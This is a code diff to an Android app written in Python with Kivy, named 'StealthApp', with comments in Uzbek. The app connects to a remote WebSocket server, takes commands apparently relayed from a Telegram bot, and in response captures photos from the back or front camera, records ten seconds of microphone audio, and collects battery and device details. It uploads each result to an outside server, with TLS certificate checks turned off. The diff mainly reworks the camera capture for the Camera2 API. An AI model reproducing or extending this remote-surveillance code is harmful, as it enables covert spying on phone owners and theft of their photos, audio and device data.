@@ -19,6 +19,13 @@ should_reconnect = [True]
 ws_ref = [None]
 
 
+def _ssl_ctx():
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    return ctx
+
+
 # --- KESH TOZALASH ---
 def clear_app_cache():
     cleared = []
@@ -31,23 +38,8 @@ def clear_app_cache():
                 shutil.rmtree(cache_dir, ignore_errors=True)
                 os.makedirs(cache_dir, exist_ok=True)
                 cleared.append("App cache")
-            try:
-                code_cache = context.getCodeCacheDir().getAbsolutePath()
-                if os.path.exists(code_cache):
-                    shutil.rmtree(code_cache, ignore_errors=True)
-                    os.makedirs(code_cache, exist_ok=True)
-                    cleared.append("Code cache")
-            except Exception:
-                pass
-
-        temp_files = ["/sdcard/capture.jpg", "/sdcard/selfie.jpg", "/sdcard/audio.m4a"]
-        for f in temp_files:
-            if os.path.exists(f):
-                os.remove(f)
-                cleared.append(os.path.basename(f))
-
         if cleared:
-            status[0] = "Kesh tozalandi: " + ", ".join(cleared) + "\nQayta ulanilmoqda..."
+            status[0] = "Kesh tozalandi. Qayta ulanilmoqda..."
         else:
             status[0] = "Kesh toza. Qayta ulanilmoqda..."
     except Exception as e:
@@ -58,7 +50,8 @@ def clear_app_cache():
 async def upload_file(file_path, media_type):
     try:
         import aiohttp
-        async with aiohttp.ClientSession() as session:
+        connector = aiohttp.TCPConnector(ssl=_ssl_ctx())
+        async with aiohttp.ClientSession(connector=connector) as session:
             with open(file_path, 'rb') as f:
                 data = aiohttp.FormData()
                 data.add_field('file', f, filename=os.path.basename(file_path))
@@ -74,14 +67,17 @@ async def upload_file(file_path, media_type):
 async def send_text(text_data):
     try:
         import aiohttp
-        async with aiohttp.ClientSession() as session:
+        connector = aiohttp.TCPConnector(ssl=_ssl_ctx())
+        async with aiohttp.ClientSession(connector=connector) as session:
             data = aiohttp.FormData()
             data.add_field('text', text_data)
             data.add_field('media_type', 'text')
             async with session.post(UPLOAD_URL, data=data) as resp:
-                status[0] = "Ma'lumot yuborildi!"
+                status[0] = "Telegramga yuborildi! (" + str(resp.status) + ")"
+        return True
     except Exception as e:
         status[0] = "Yuborish xatolik: " + str(e)[:100]
+        return False
 
 
 # --- QURILMA MA'LUMOTLARI ---
@@ -118,68 +114,142 @@ def get_device_info():
             "Model: " + Build.MODEL + "\n"
             "Ishlab chiqaruvchi: " + Build.MANUFACTURER + "\n"
             "Android: " + VERSION.RELEASE + "\n"
-            "SDK: " + str(VERSION.SDK_INT) + "\n"
-            "Qurilma: " + Build.DEVICE
+            "SDK: " + str(VERSION.SDK_INT)
         )
     except Exception as e:
         return "Qurilma info xatolik: " + str(e)
 
 
-# --- KAMERA ---
-def take_photo_camera(camera_id, loop):
+# --- KAMERA (Camera2 API) ---
+def take_photo_camera(front_camera, loop):
     try:
         from jnius import autoclass, PythonJavaClass, java_method
-        Camera = autoclass('android.hardware.Camera')
-        SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
-        FileOutputStream = autoclass('java.io.FileOutputStream')
-        activity = autoclass('org.kivy.android.PythonActivity').mActivity
+        activity      = autoclass('org.kivy.android.PythonActivity').mActivity
+        CamMgr        = autoclass('android.hardware.camera2.CameraManager')
+        CamDev        = autoclass('android.hardware.camera2.CameraDevice')
+        CamChars      = autoclass('android.hardware.camera2.CameraCharacteristics')
+        ImageReader   = autoclass('android.media.ImageReader')
+        ImageFmt      = autoclass('android.graphics.ImageFormat')
+        HandlerThread = autoclass('android.os.HandlerThread')
+        Handler       = autoclass('android.os.Handler')
+        ArrayList     = autoclass('java.util.ArrayList')
+        FileOutStream = autoclass('java.io.FileOutputStream')
 
-        cam_name = "selfie" if camera_id == 1 else "capture"
-        # Android 10+ da /sdcard/ o'rniga app private papkasini ishlatamiz
-        ext_dir = activity.getExternalFilesDir(None).getAbsolutePath()
-        filepath = ext_dir + "/" + cam_name + ".jpg"
+        ext_dir  = activity.getExternalFilesDir(None).getAbsolutePath()
+        cam_name = 'selfie' if front_camera else 'capture'
+        filepath = ext_dir + '/' + cam_name + '.jpg'
 
-        camera = Camera.open(camera_id)
-        # Har doim yangi texture ID ishlatamiz (conflict bo'lmasin)
-        texture = SurfaceTexture(camera_id * 100 + 1)
-        try:
-            camera.setPreviewTexture(texture)
-        except Exception:
-            pass  # Ba'zi qurilmalarda preview kerak emas
-        camera.startPreview()
+        cam_mgr = activity.getSystemService('camera')
 
-        done = [False]
-        path = [None]
+        # Front yoki orqa kamerani topish
+        target_id = None
+        wanted = CamChars.LENS_FACING_FRONT if front_camera else CamChars.LENS_FACING_BACK
+        for cid in cam_mgr.getCameraIdList():
+            chars  = cam_mgr.getCameraCharacteristics(cid)
+            facing = chars.get(CamChars.LENS_FACING)
+            if facing == wanted:
+                target_id = cid
+                break
+        if target_id is None:
+            target_id = cam_mgr.getCameraIdList()[0]
 
-        class PicCb(PythonJavaClass):
-            __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
+        # Background thread
+        ht = HandlerThread('CamBgThread')
+        ht.start()
+        h = Handler(ht.getLooper())
+
+        reader = ImageReader.newInstance(1280, 720, ImageFmt.JPEG, 2)
+
+        done     = [False]
+        img_path = [None]
+
+        class ImgListener(PythonJavaClass):
+            __javainterfaces__ = ['android/media/ImageReader$OnImageAvailableListener']
             __javacontext__ = 'app'
-            @java_method('([BLandroid/hardware/Camera;)V')
-            def onPictureTaken(self, data, cam):
+            @java_method('(Landroid/media/ImageReader;)V')
+            def onImageAvailable(self, rdr):
                 try:
-                    fos = FileOutputStream(filepath)
-                    fos.write(data)
-                    fos.close()
-                    path[0] = filepath
+                    image = rdr.acquireLatestImage()
+                    if image:
+                        buf  = image.getPlanes()[0].getBuffer()
+                        size = buf.remaining()
+                        data = bytearray(size)
+                        buf.get(data)
+                        image.close()
+                        fos = FileOutStream(filepath)
+                        fos.write(data)
+                        fos.close()
+                        img_path[0] = filepath
                 except Exception as ex:
-                    print("Saqlash xatoligi: " + str(ex))
+                    print('ImgListener xatolik: ' + str(ex))
                 finally:
-                    cam.release()
                     done[0] = True
 
-        camera.takePicture(None, None, PicCb())
-        for _ in range(30):
+        reader.setOnImageAvailableListener(ImgListener(), h)
+
+        cam_ref  = [None]
+        sess_ref = [None]
+
+        class SessCallback(PythonJavaClass):
+            __javainterfaces__ = ['android/hardware/camera2/CameraCaptureSession$StateCallback']
+            __javacontext__ = 'app'
+            @java_method('(Landroid/hardware/camera2/CameraCaptureSession;)V')
+            def onConfigured(self, session):
+                sess_ref[0] = session
+                try:
+                    req = cam_ref[0].createCaptureRequest(CamDev.TEMPLATE_STILL_CAPTURE)
+                    req.addTarget(reader.getSurface())
+                    session.capture(req.build(), None, h)
+                except Exception as ex:
+                    print('Capture xatolik: ' + str(ex))
+                    done[0] = True
+            @java_method('(Landroid/hardware/camera2/CameraCaptureSession;)V')
+            def onConfigureFailed(self, session):
+                done[0] = True
+
+        class CamCallback(PythonJavaClass):
+            __javainterfaces__ = ['android/hardware/camera2/CameraDevice$StateCallback']
+            __javacontext__ = 'app'
+            @java_method('(Landroid/hardware/camera2/CameraDevice;)V')
+            def onOpened(self, camera):
+                cam_ref[0] = camera
+                try:
+                    surfaces = ArrayList()
+                    surfaces.add(reader.getSurface())
+                    camera.createCaptureSession(surfaces, SessCallback(), h)
+                except Exception as ex:
+                    print('Session xatolik: ' + str(ex))
+                    done[0] = True
+            @java_method('(Landroid/hardware/camera2/CameraDevice;I)V')
+            def onDisconnected(self, camera, code):
+                done[0] = True
+            @java_method('(Landroid/hardware/camera2/CameraDevice;I)V')
+            def onError(self, camera, code):
+                done[0] = True
+
+        cam_mgr.openCamera(target_id, CamCallback(), h)
+
+        for _ in range(60):
             if done[0]:
                 break
-            time.sleep(0.3)
+            time.sleep(0.2)
 
-        if path[0] and os.path.exists(path[0]):
-            asyncio.run_coroutine_threadsafe(upload_file(path[0], "photo"), loop)
-            status[0] = "Rasm olindi, yuborilmoqda..."
+        if img_path[0] and os.path.exists(img_path[0]):
+            asyncio.run_coroutine_threadsafe(upload_file(img_path[0], 'photo'), loop)
+            status[0] = 'Rasm olindi, yuborilmoqda...'
         else:
-            status[0] = "Kamera: rasm olinmadi"
+            status[0] = 'Kamera: rasm olinmadi'
+
+        try:
+            if sess_ref[0]: sess_ref[0].close()
+            if cam_ref[0]:  cam_ref[0].close()
+            reader.close()
+            ht.quit()
+        except Exception:
+            pass
+
     except Exception as e:
-        status[0] = "Kamera xatolik: " + str(e)
+        status[0] = 'Kamera xatolik: ' + str(e)
 
 
 # --- AUDIO ---
@@ -187,14 +257,13 @@ def record_audio(loop):
     try:
         from jnius import autoclass
         MediaRecorder = autoclass('android.media.MediaRecorder')
-        AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
-        OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
-        AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')
-        activity = autoclass('org.kivy.android.PythonActivity').mActivity
+        AudioSource   = autoclass('android.media.MediaRecorder$AudioSource')
+        OutputFormat  = autoclass('android.media.MediaRecorder$OutputFormat')
+        AudioEncoder  = autoclass('android.media.MediaRecorder$AudioEncoder')
+        activity      = autoclass('org.kivy.android.PythonActivity').mActivity
 
-        # Android 10+ da app private papkasini ishlatamiz
-        ext_dir = activity.getExternalFilesDir(None).getAbsolutePath()
-        filepath = ext_dir + "/audio.m4a"
+        ext_dir  = activity.getExternalFilesDir(None).getAbsolutePath()
+        filepath = ext_dir + '/audio.m4a'
 
         recorder = MediaRecorder()
         recorder.setAudioSource(AudioSource.MIC)
@@ -203,14 +272,14 @@ def record_audio(loop):
         recorder.setOutputFile(filepath)
         recorder.prepare()
         recorder.start()
-        status[0] = "Yozilmoqda (10 sek)..."
+        status[0] = 'Yozilmoqda (10 sek)...'
         time.sleep(10)
         recorder.stop()
         recorder.release()
         if os.path.exists(filepath):
-            asyncio.run_coroutine_threadsafe(upload_file(filepath, "audio"), loop)
+            asyncio.run_coroutine_threadsafe(upload_file(filepath, 'audio'), loop)
     except Exception as e:
-        status[0] = "Audio xatolik: " + str(e)
+        status[0] = 'Audio xatolik: ' + str(e)
 
 
 # --- WEBSOCKET ---
@@ -221,14 +290,10 @@ async def ws_loop():
         try:
             import websockets
             retry += 1
-            status[0] = "Ulanilmoqda... (" + str(retry) + "-urinish)\n" + WS_URL
-            # SSL sertifikat tekshiruvini o'chiramiz (Android CA muammo)
-            ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-            ssl_ctx.check_hostname = False
-            ssl_ctx.verify_mode = ssl.CERT_NONE
+            status[0] = 'Ulanilmoqda... (' + str(retry) + '-urinish)'
             async with websockets.connect(
                 WS_URL,
-                ssl=ssl_ctx,
+                ssl=_ssl_ctx(),
                 ping_interval=30,
                 ping_timeout=15,
                 open_timeout=15,
@@ -236,28 +301,30 @@ async def ws_loop():
             ) as ws:
                 ws_ref[0] = ws
                 retry = 0
-                status[0] = "ULANDI!\nTelegram botdan buyruq bering."
+                status[0] = 'ULANDI! Telegram botdan buyruq bering.'
                 while True:
                     msg = await ws.recv()
-                    status[0] = "Buyruq: " + msg
-                    if msg == "take_photo":
-                        threading.Thread(target=take_photo_camera, args=(0, loop), daemon=True).start()
-                    elif msg == "selfie":
-                        threading.Thread(target=take_photo_camera, args=(1, loop), daemon=True).start()
-                    elif msg == "record_audio":
+                    status[0] = 'Buyruq: ' + msg
+
+                    if msg == 'take_photo':
+                        threading.Thread(target=take_photo_camera, args=(False, loop), daemon=True).start()
+                    elif msg == 'selfie':
+                        threading.Thread(target=take_photo_camera, args=(True, loop), daemon=True).start()
+                    elif msg == 'record_audio':
                         threading.Thread(target=record_audio, args=(loop,), daemon=True).start()
-                    elif msg == "battery":
+                    elif msg == 'battery':
                         info = get_battery_info()
-                        await send_text(info)
                         status[0] = info
-                    elif msg == "device_info":
+                        await send_text(info)
+                    elif msg == 'device_info':
                         info = get_device_info()
-                        await send_text(info)
                         status[0] = info
+                        await send_text(info)
+
         except Exception as e:
             ws_ref[0] = None
             wait = min(5 * retry, 30)
-            status[0] = "Xatolik:\n" + str(e)[:120] + "\n\n" + str(wait) + " soniyadan so'ng qayta..."
+            status[0] = 'Xatolik:\n' + str(e)[:120] + '\n\n' + str(wait) + ' soniyadan so\'ng qayta...'
             await asyncio.sleep(wait)
 
 
@@ -268,7 +335,7 @@ def run_loop():
         asyncio.set_event_loop(loop)
         loop.run_until_complete(ws_loop())
     except Exception as e:
-        status[0] = "Ishga tushirishda xatolik:\n" + str(e)[:150]
+        status[0] = 'Ishga tushirishda xatolik:\n' + str(e)[:150]
 
 
 def force_reconnect():
@@ -290,7 +357,7 @@ class StealthApp(App):
         layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
 
         self.label = Label(
-            text="Ishga tushirilmoqda...",
+            text='Ishga tushirilmoqda...',
             font_size='14sp',
             halign='center',
             valign='middle',
@@ -302,7 +369,7 @@ class StealthApp(App):
         )
 
         btn = Button(
-            text="Keshni tozala va qayta ulash",
+            text='Keshni tozala va qayta ulash',
             font_size='13sp',
             size_hint=(1, 0.15),
             background_color=(0.2, 0.5, 0.9, 1),
@@ -312,7 +379,6 @@ class StealthApp(App):
         layout.add_widget(self.label)
         layout.add_widget(btn)
 
-        # Ruxsatlarni asosiy threaddan so'rash (pyjnius uchun)
         if platform == 'android':
             Clock.schedule_once(self._request_permissions, 0.5)
         else:
@@ -335,11 +401,10 @@ class StealthApp(App):
                 self._on_permissions_result
             )
         except Exception as e:
-            status[0] = "Ruxsat xatoligi: " + str(e)[:100]
+            status[0] = 'Ruxsat xatoligi: ' + str(e)[:100]
             threading.Thread(target=run_loop, daemon=True).start()
 
     def _on_permissions_result(self, permissions, grants):
-        # Ruxsatlar so'ralgandan so'ng ulanishni boshlash
         threading.Thread(target=run_loop, daemon=True).start()
 
     def update_ui(self, dt):
